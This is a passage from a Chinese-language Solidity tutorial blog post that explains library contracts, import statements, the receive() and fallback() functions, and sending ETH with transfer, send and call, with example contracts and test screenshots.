10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它主要包含两个函数，<code>toString()</code>将<code>uint256</code>转换为10进制的<code>string</code>，<code>toHexString()</code>将<code>uint256</code>转换为16进制的<code>string</code>。</p><h3 id="如何使用库合约？">如何使用库合约？</h3><p>我们用<code>Strings</code>库合约的<code>toHexString()</code>来演示两种使用库合约中函数的办法。</p><ul><li>利用using for指令，指令<code>using A for B;</code>可用于附加库合约（从库<code> A</code>）到任何类型（<code>B</code>）。添加完指令后，库<code>A</code>中的函数会自动添加为<code>B</code>类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 利用using for指令</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // 库合约中的函数会自动添加为uint256型变量的成员</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过库合约名称调用函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 直接通过库合约名调用</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们部署合约并输入<code>130</code>测试一下，两种方法均能返回正确的16进制string <code>0x82</code>。证明我们调用库合约成功！</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204035623180.png" alt="image-20250204035623180"></p><p>常见的库合约有：</p><ol><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>：将<code>uint256</code>转换为<code>String</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>：判断某个地址是否为合约地址</li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>：更安全的使用<code>Create2 EVM opcode</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>：跟数组相关的库合约</li></ol><h2 id="Import">Import</h2><p>在Solidity中，<code>import</code>语句可以帮助我们在一个文件中引用另一个文件的内容，提高代码的可重用性和组织性。本教程将向你介绍如何在Solidity中使用<code>import</code>语句。</p><h3 id="Import用法"><code>Import</code>用法</h3><ul><li>通过源文件相对位置导入，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件结构</span><br><span class="line">├── Import.sol</span><br><span class="line">└── Yeye.sol</span><br><span class="line"></span><br><span class="line">// 通过文件相对位置import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过源文件网址导入网上的合约的全局符号，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 通过网址引用</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过<code>npm</code>的目录导入，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过指定<code>全局符号</code>导入合约特定的全局符号，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>引用(<code>import</code>)在代码中的位置为：在声明版本号之后，在其余代码之前。</li></ul><h3 id="测试导入结果">测试导入结果</h3><p>我们可以用下面这段代码测试是否成功导入了外部源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 通过文件相对位置import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br><span class="line">// 通过`全局符号`导入特定的合约</span><br><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br><span class="line">// 通过网址引用</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br><span class="line">// 引用OpenZeppelin合约</span><br><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Import &#123;</span><br><span class="line">    // 成功导入Address库</span><br><span class="line">    using Address for address;</span><br><span class="line">    // 声明yeye变量</span><br><span class="line">    Yeye yeye = new Yeye();</span><br><span class="line"></span><br><span class="line">    // 测试是否能调用yeye的函数</span><br><span class="line">    function test() external&#123;</span><br><span class="line">        yeye.hip();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Yeye.sol</code>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 第10讲合约继承中的Yeye合约</span><br><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye hip&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye pop&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果如下：</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204041504259.png" alt="image-20250204041504259"></p><h2 id="接收和发送ETH">接收和发送ETH</h2><p>本讲主要介绍ETH的接收和发送。</p><h3 id="接收ETH">接收ETH</h3><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ul><li>接收ETH</li><li>处理合约中不存在的函数调用（代理合约proxy contract）</li></ul><p><strong>注意⚠️</strong>：在Solidity 0.6.x版本之前，语法上只有 <code>fallback()</code> 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，Solidit才将 <code>fallback()</code> 函数拆分成 <code>receive()</code> 和 <code>fallback()</code> 两个函数。</p><h4 id="接收ETH函数receive">接收ETH函数<code>receive</code></h4><p><code>receive()</code>函数是在合约收到<code>ETH</code>转账时被调用的函数。</p><p>一个合约最多有一个<code>receive()</code>函数，声明方式与一般函数不一样，不需要<code>function</code>关键字：<code>receive() external payable &#123; ... &#125;</code>。<code>receive()</code>函数不能有任何的参数，不能返回任何值，<strong>必须包含<code>external</code>和<code>payable</code>。</strong></p><p>当合约接收ETH的时候，<code>receive()</code>会被触发。<code>receive()</code>最好不要执行太多的逻辑因为如果别人用<code>send</code>和<code>transfer</code>方法发送<code>ETH</code>的话，<code>gas</code>会限制在<code>2300</code>，<code>receive()</code>太复杂可能会触发<code>Out of Gas</code>报错；如果用<code>call</code>就可以自定义<code>gas</code>执行更复杂的逻辑（这三种发送ETH的方法我们之后会讲到）。</p><p>我们可以在<code>receive()</code>里发送一个<code>event</code>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些恶意合约，会在<code>receive()</code> 函数（老版本的话，就是 <code>fallback()</code> 函数）嵌入恶意消耗<code>gas</code>的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。</p><h4 id="回退ETH函数fallback">回退ETH函数<code>fallback</code></h4><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。</p><p><code>fallback()</code>声明时不需要<code>function</code>关键字，<strong>必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰</strong>，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</p><p>我们定义一个<code>fallback()</code>函数，被触发时候会释放<code>fallbackCalled</code>事件，并输出<code>msg.sender</code>，<code>msg.value</code>和<code>msg.data</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="receive和fallback的区别"><code>receive</code>和<code>fallback</code>的区别</h4><p><code>receive</code>和<code>fallback</code>都能够用于接收<code>ETH</code>，他们触发的规则如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">触发fallback() 还是 receive()?</span><br><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><p>简单来说，合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>。</p><p><code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约<strong>直接</strong>发送<code>ETH</code>将会报错（你仍可以通过带有<code>payable</code>的函数向合约发送<code>ETH</code>）。</p><h4 id="测试代码演示">测试代码演示</h4><p>完整的测试代码<code>Fallback.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    /* 触发fallback() 还是 receive()?</span><br><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()  fallback   </span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    // 定义事件</span><br><span class="line">    event receivedCalled(address Sender, uint Value);</span><br><span class="line">    event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">    // 接收ETH时释放Received事件</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        emit receivedCalled(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // fallback</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署并执行代码，<code>VALUE</code>栏中输入要发送到合约中的金额，<code>CALLDATA</code>留空，点击<code>Transact</code>，成功触发到<code>receivedCalled</code>事件。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204160942747.png" alt="image-20250204160942747"></p><p>同样，<code>VALUE</code>栏中输入要发送到合约中的金额，<code>CALLDATA</code>输入任意编写的<code>0xabcd</code>，点击<code>Transact</code>，成功触发到<code>fallbackCalled</code>事件。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204161621064.png" alt="image-20250204161621064"></p><h3 id="发送ETH">发送ETH</h3><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>，其中<code>call()</code>是被鼓励的用法。</p><p>完整的测试代码<code>SendETH.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 3种方法发送ETH</span><br><span class="line">// transfer: 2300 gas, revert</span><br><span class="line">// send: 2300 gas, return bool</span><br><span class="line">// call: all gas, return (bool, data)</span><br><span class="line"></span><br><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line">error CallFailed(); // 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 用transfer()发送ETH</span><br><span class="line">    function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        _to.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send()发送ETH</span><br><span class="line">    function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">        bool success = _to.send(amount);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert SendFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // call()发送ETH</span><br><span class="line">    function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">        (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert CallFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line"></span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="接收ETH合约">接收ETH合约</h4><p>我们先部署一个接收<code>ETH</code>合约<code>ReceiveETH</code>。<code>ReceiveETH</code>合约里有一个事件<code>Log</code>，记录收到的<code>ETH</code>数量和<code>gas</code>剩余。还有两个函数，一个是<code>receive()</code>函数，收到<code>ETH</code>被触发，并发送<code>Log</code>事件；另一个是查询合约<code>ETH</code>余额的<code>getBalance()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>ReceiveETH</code>合约后，运行<code>getBalance()</code>函数，可以看到当前合约的<code>ETH</code>余额为<code>0</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204164248838.png" alt="image-20250204164248838"></p><h4 id="发送ETH合约">发送ETH合约</h4><p>我们将实现三种方法向<code>ReceiveETH</code>合约发送<code>ETH</code>。首先，先在发送ETH合约<code>SendETH</code>中实现<code>payable</code>的<code>构造函数</code>和<code>receive()</code>，让我们能够在部署时和部署后向合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Transfer用法-次优">Transfer用法(次优)</h4><ul><li><p>用法是<code>接收方地址.transfer(发送ETH数额)</code>。</p></li><li><p><code>transfer()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</p></li><li><p><code>transfer()</code>如果转账失败，会自动<code>revert</code>（回滚交易）。</p></li></ul><p>代码样例，注意里面的<code>_to</code>填<code>ReceiveETH</code><strong>合约的地址</strong>，<code>amount</code>是<code>ETH</code>转账金额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 用transfer()发送ETH</span><br><span class="line">function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    _to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>SendETH</code>合约后，对<code>ReceiveETH</code>合约发送ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172302122.png" alt="image-20250204172302122"></p><p><code>ReceiveETH</code>合约成功接收到转账的ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172327987.png" alt="image-20250204172327987"></p><p><code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172500152.png" alt="image-20250204172500152"></p><h4 id="Send用法">Send用法</h4><p>用法是<code>接收方地址.send(发送ETH数额)</code>。</p><ul><li><code>send()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</li><li><code>send()</code>如果转账失败，不会<code>revert</code>。</li><li><code>send()</code>的返回值是<code>bool</code>，代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line"></span><br><span class="line">// send()发送ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172829438.png" alt="image-20250204172829438"></p><h4 id="Call用法-提倡使用">Call用法(提倡使用)</h4><p>用法是<code>接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</code>。</p><ul><li><code>call()</code>没有<code>gas</code>限制，可以支持对方合约<code>fallback()</code>或<code>receive()</code>函数实现复杂逻辑。</li><li><code>call()</code>如果转账失败，不会<code>revert</code>。</li><li><code>call()</code>的返回值是<code>(bool, bytes)</code>，其中<code>bool</code>代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error CallFailed(); // 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">// call()发送ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>SendETH</code>合约后，对<code>ReceiveETH</code>合约发送ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204165726035.png" alt="image-20250204165726035"></p><p><code>ReceiveETH</code>合约成功接收到转账的ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204165840188.png" alt="image-20250204165840188"></p><p><code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204170920553.png" alt="image-20250204170920553"></p><h4 id="总结">总结</h4><p>这一讲，我们介绍<code>Solidity</code>三种发送<code>ETH</code>的方法：<code>transfer</code>，<code>send</code>和<code>call</code>。</p><ul><li>**<code>call</code>没有<code>gas</code>限制，最为灵活，是最提倡的方法！！！**⚠️⚠️⚠️</li><li><code>transfer</code>有<code>2300 gas</code>限制，但是发送失败会自动<code>revert</code>交易，是次优选择；</li><li><code>send</code>有<code>2300 gas</code>限制，而且发送失败不会自动<code>revert</code>交易，几乎没有人用它。</li></ul><h2 id="参考">参考</h2><p><a href="https://www.wtf.academy/zh/course/solidity102/Fallback">https://www.wtf.academy/zh/course/solidity102/Fallback</a></p><p><a href="https://www.wtf.academy/zh/course/solidity102/SendETH">https://www.wtf.academy/zh/course/solidity102/SendETH</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
